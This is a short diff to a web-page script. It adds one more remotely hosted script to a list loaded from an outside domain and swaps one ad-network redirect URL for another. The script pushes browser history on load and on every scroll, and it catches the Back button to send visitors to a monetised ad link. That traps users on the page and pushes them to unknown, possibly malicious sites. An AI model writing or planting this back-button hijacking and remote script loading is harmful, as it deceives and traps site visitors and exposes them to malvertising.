@@ -1,6 +1,7 @@
 let mainLoad = [
   "https://agcali.pahe.my.id/histads.js",
   "https://agcali.pahe.my.id/control.js",
+  "https://agcali.pahe.my.id/adsiklan.js",
   "https://agcali.pahe.my.id/control-remove.js"
 ];
 
@@ -22,7 +23,7 @@ getLoad();
 history.pushState(null, document.title, window.location.href);
 window.addEventListener('popstate', function (event)
 {
-  window.location.href="https://www.effectivecpmcontent.com/uijctn538c?key=4f219c1087bce980ac7a203a864c9d2b";
+  window.location.href="https://merelyerroneous.com/ymf90ucn?key=2e5aefd8f3bb88228c2962cbc1d8ddae";
 });
 window.addEventListener('scroll', function() {
   history.pushState(null, document.title, window.location.href);
